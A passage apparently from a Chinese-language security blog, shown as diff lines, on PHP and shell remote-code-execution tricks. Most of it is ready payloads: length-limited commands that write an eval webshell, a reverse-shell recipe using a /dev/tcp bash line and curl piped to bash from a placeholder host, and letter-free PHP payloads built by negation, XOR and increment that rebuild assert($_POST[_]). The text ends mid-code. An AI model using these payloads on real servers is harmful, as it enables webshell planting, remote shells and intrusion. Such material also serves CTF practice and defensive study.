+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">shell_exec</span>(<span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">1</span>]);
+</span></span><span style="display:flex;"><span>}<span style="color:#ff636f">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">exit</span>(<span style="color:#a6be9d">&#39;too long&#39;</span>);
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>########## 14位可控</p>
+<pre tabindex="0"><code>echo \&lt;?=@eval(\$_POST\[1\]\)\; &gt; 1;mv 1 1.php;jp</code></pre><blockquote>
+<p>echo \&lt;?php&gt;1</p>
+<p>echo eval\(&raquo;1</p>
+<p>echo \$_GET&raquo;1</p>
+<p>echo \[1\]&raquo;1</p>
+<p>echo \)\;&raquo;1</p>
+<p>mv 1 1.php</p>
+</blockquote>
+<p>########## 7位可控</p>
+<p>知识点</p>
+<blockquote>
+<ul>
+<li>&gt; a 虽然没有输入但是会创建a文件</li>
+<li>ls -t  ls基于时间排序（从晚到早)</li>
+<li>sh a   把a里面的每行内容当作命令来执行</li>
+<li>使用\进行命令拼接     l\s=ls</li>
+<li>使用base64编码笔迷案特殊字符</li>
+</ul>
+</blockquote>
+<p>目标：写入语句 &lt;?php eval($_GET[1]);</p>
+<p>base64编码后  PD9waHAgZXZhbCgkX0dFVFsxXSk7</p>
+<p>需要被执行的语句是 echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</p>
+<p>payload</p>
+<pre tabindex="0"><code>&gt;hp
+&gt;1.p\\
+&gt;d\&gt;\\
+&gt;\-\\
+&gt;e64\\
+&gt;bas\\
+&gt;7\|\\
+&gt;XSk\\
+&gt;Fsx\\
+&gt;dFV\\
+&gt;kX0\\
+&gt;bCg\\
+&gt;XZh\\
+&gt;AgZ\\
+&gt;waH\\
+&gt;PD9\\
+&gt;o\ \\
+&gt;ech\\
+ls -t&gt;0
+sh0</code></pre><p>######### 5位可控</p>
+<p>知识点</p>
+<ol>
+<li>
+<p>输入通配符*，linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</p>
+</li>
+<li>
+<p>通过rev来倒置输出内容（rev命令将文件中的每行内容以字符为单位反序输出）</p>
+</li>
+<li>
+<p>用dir来替代ls不换行输出；rev将文件内容反向输出；在用ls时，写到a时每个文件名都是单独一行</p>
+<pre tabindex="0"><code>&gt;rev
+echo 1234&gt;v
+*v 等同于命令rev v</code></pre></li>
+</ol>
+<p>echo${IFS}PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</p>
+<p>那么我们只需要将上面的代码拆分倒叙输入到主机即可。我们需要让sh先执行a文件(ls -th&gt;f)就会得到f文件，最后再让sh去执行f文件即可得到1.php。</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303271606718.png" alt="image-20230327160653643" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303271606718.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303271606718.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303271606718.png?size=large 2x" data-title="image-20230327160653643" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>######## 反弹shell</p>
+<blockquote>
+<ol>
+<li>
+<p>公网服务器开启监听</p>
+<p>nc -lvp 4444 或  nc -vv -lp 4444</p>
+</li>
+<li>
+<p>在公网服务器写一个文件（qwzf文件)，内容是下面的命令</p>
+<p>bash -i&gt;&amp;/dev/tcp/x.x.x.x/4444 0&gt;&amp;1</p>
+</li>
+<li>
+<p>浏览器执行payload</p>
+<p>?cmd=curl x.x.x.x:8002/qwzf|bash</p>
+</li>
+</ol>
+</blockquote>
+<h6 id="无回显不出网" class="heading-element"><span>0.0.0.4.3  无回显不出网</span>
+  <a href="#%e6%97%a0%e5%9b%9e%e6%98%be%e4%b8%8d%e5%87%ba%e7%bd%91" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>依旧确认Web应用物理路径，然后写入webshell。</p>
+<p>找web路径的方法和[无回显出网]条件下的第一种方法一样：</p>
+<p><strong>定位Web特殊文件路径并将路径写入当前目录下的txt文件</strong></p>
+<p>有了路径我们就可以直接写webshell</p>
+<p>例如：</p>
+<pre tabindex="0"><code>cmd /c &#34;for /f %i in (&#39;dir /x /s /b index.html&#39;) do (echo%i&gt;%i.path.txt)%26(ipconfig&gt;%i.ipconfig.txt)&#34;</code></pre><h5 id="无字母数字rce" class="heading-element"><span>0.0.0.5  无字母数字rce</span>
+  <a href="#%e6%97%a0%e5%ad%97%e6%af%8d%e6%95%b0%e5%ad%97rce" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="取反" class="heading-element"><span>0.0.0.5.1  取反</span>
+  <a href="#%e5%8f%96%e5%8f%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>如图示，对phpinfo取反，再取反，仍然得到phpinfo，但是可以利用它进行一些对数字字母过滤的绕过</p>
+<p>paylaod: (~%8F%97%8F%96%91%99%90)();</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">urlencode</span>(<span style="color:#ff636f">~</span><span style="color:#a6be9d">&#39;assert&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">$a</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#a6be9d">&#39;666&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$b</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">urlencode</span>(<span style="color:#ff636f">~</span><span style="color:#a6be9d">&#39;eval($_POST[1]);&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">$b</span>;</span></span></code></pre></div><p>shell</p>
+<pre tabindex="0"><code>?cmd=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);</code></pre><pre tabindex="0"><code>?cmd=$_=~%9E%8C%8C%9A%8D%8B;$__=~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4;$_($__);</code></pre><p>PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(&lsquo;phpinfo&rsquo;)();来执行函数，第一个括号中可以是任意PHP表达式。</p>
+<h6 id="异或" class="heading-element"><span>0.0.0.5.2  异或</span>
+  <a href="#%e5%bc%82%e6%88%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>在PHP中两个变量进行异或时，会先将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完又将结果从二进制转换成ASCI值，再转换成字符串。</p>
+<p>这里有一个异或构造的脚本, 相信聪明的你一看就知道怎么回事了</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">valid</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;1234567890!@$%^*()</span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">[];</span><span style="color:#a6be9d">\&#39;\&#34;</span><span style="color:#a6be9d">,.&lt;&gt;/?-=_`~ &#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">answer</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">str</span>(<span style="color:#58a1dd">input</span>(<span style="color:#a6be9d">&#34;请输入进行异或构造的字符串：&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">tmp1</span>, <span style="color:#58a1dd">tmp2</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;&#39;</span>, <span style="color:#a6be9d">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">for</span> <span style="color:#58a1dd">c</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">answer</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#ff636f">for</span> <span style="color:#58a1dd">i</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">valid</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">for</span> <span style="color:#58a1dd">j</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">valid</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">ord</span>(<span style="color:#58a1dd">i</span>) <span style="color:#ff636f">^</span> <span style="color:#58a1dd">ord</span>(<span style="color:#58a1dd">j</span>) <span style="color:#ff636f">==</span> <span style="color:#58a1dd">ord</span>(<span style="color:#58a1dd">c</span>)):
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">tmp1</span> <span style="color:#ff636f">+=</span> <span style="color:#58a1dd">i</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">tmp2</span> <span style="color:#ff636f">+=</span> <span style="color:#58a1dd">j</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">else</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#ff636f">continue</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">break</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#a6be9d">&#34;tmp1为:&#34;</span>,<span style="color:#58a1dd">tmp1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#a6be9d">&#34;tmp2为:&#34;</span>,<span style="color:#58a1dd">tmp2</span>)</span></span></code></pre></div><p>那么怎么利用呢？</p>
+<p>下面是几个例子</p>
+<p>需要注意的是，由于我们的Payload中含有一些特殊字符，我们传参的时候需要对Payload进行一次URL编码。</p>
+<pre tabindex="0"><code>$__=(&#34;#&#34;^&#34;|&#34;).(&#34;.&#34;^&#34;~&#34;).(&#34;/&#34;^&#34;`&#34;).(&#34;|&#34;^&#34;/&#34;).(&#34;{&#34;^&#34;/&#34;);  //变量$__值为字符串&#39;_POST&#39;</code></pre><pre tabindex="0"><code>mess=$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;);$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;);$___=$$__;$_($___[_]);&amp;_=print_r(show_source(&#39;p.php&#39;));</code></pre><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;!((%)(&#34;</span><span style="color:#ff636f">^</span><span style="color:#a6be9d">&#34;@[[@[</span><span style="color:#a6be9d">\\</span><span style="color:#a6be9d">&#34;</span>;   <span style="color:#828b96;font-style:italic">//构造出assert
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;!+/((&#34;</span><span style="color:#ff636f">^</span><span style="color:#a6be9d">&#34;~{`{|&#34;</span>;   <span style="color:#828b96;font-style:italic">//构造出_POST
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$___</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$$__</span>;   <span style="color:#828b96;font-style:italic">//$___ = $_POST
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$_</span>(<span style="color:#58a1dd">$___</span>[<span style="color:#58a1dd">_</span>]);   <span style="color:#828b96;font-style:italic">//assert($_POST[_]);
+</span></span></span></code></pre></div><pre tabindex="0"><code>${%A0%B8%BA%AB^%ff%ff%ff%ff}{%A0}();&amp;%A0=命令或函数  </code></pre><pre tabindex="0"><code>${&#34;`{{{&#34;^&#34;?&lt;&gt;/&#34;}[&#39;+&#39;]();&amp;+=命令   //$_GET[+]</code></pre><h6 id="自增" class="heading-element"><span>0.0.0.5.3  自增</span>
+  <a href="#%e8%87%aa%e5%a2%9e" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>个人认为拿到自增的初始值是自增rce最精髓的部分之一</p>
+<ul>
+<li>
+<p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为&quot;Array&quot;。再取这个字符串的第一个字母，就可以获得&quot;==A==&quot;。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;&#39;</span><span style="color:#ff636f">.</span>[];
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">$a</span>); <span style="color:#828b96;font-style:italic">//Array
+</span></span></span></code></pre></div></li>
+<li>
+<p>$++对变量进行了自增操作,由于我们没有定义的值,PHP会给赋一个默认值NULL==0,由此我们可以看出,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">++</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">$_</span>);  <span style="color:#828b96;font-style:italic">//1
+</span></span></span></code></pre></div></li>
+<li>
+<p>$__没有定义，默认为Null也即==0==</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">$__</span>);</span></span></code></pre></div><p>那++$__就是==1==</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#ff636f">++</span><span style="color:#58a1dd">$__</span>);</span></span></code></pre></div></li>
+<li>
+<p>==NAN==</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span> <span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff636f">echo</span> ((<span style="color:#58a1dd">_</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">_</span>)<span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;&#39;</span>);</span></span></code></pre></div><p>==N==</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> ((<span style="color:#58a1dd">_</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">_</span>)<span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;&#39;</span>){<span style="color:#58a1dd">$_</span>};</span></span></code></pre></div></li>
+</ul>
+<p>payload</p>
+<p>初始</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">=</span>[]<span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;&#39;</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;Array&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$___</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_</span>[<span style="color:#58a1dd">$__</span>];   <span style="color:#828b96;font-style:italic">//得到&#34;A&#34;，$__没有定义，默认为False也即0，此时$___=&#34;A&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$___</span>;   <span style="color:#828b96;font-style:italic">//$__=&#34;A&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$_</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$___</span>;   <span style="color:#828b96;font-style:italic">//$_=&#34;A&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;S&#34;，此时$__=&#34;S&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$___</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$___=&#34;AS&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$___</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$___=&#34;ASS&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_</span>;   <span style="color:#828b96;font-style:italic">//$__=&#34;A&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;E&#34;，此时$__=&#34;E&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$___</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$___=&#34;ASSE&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;R&#34;，此时$__=&#34;R&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$___</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$___=&#34;ASSER&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;T&#34;，此时$__=&#34;T&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$___</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$___=&#34;ASSERT&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_</span>;   <span style="color:#828b96;font-style:italic">//$__=&#34;A&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$____</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;_&#34;</span>;   <span style="color:#828b96;font-style:italic">//$____=&#34;_&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;P&#34;，此时$__=&#34;P&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$____</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$____=&#34;_P&#34;
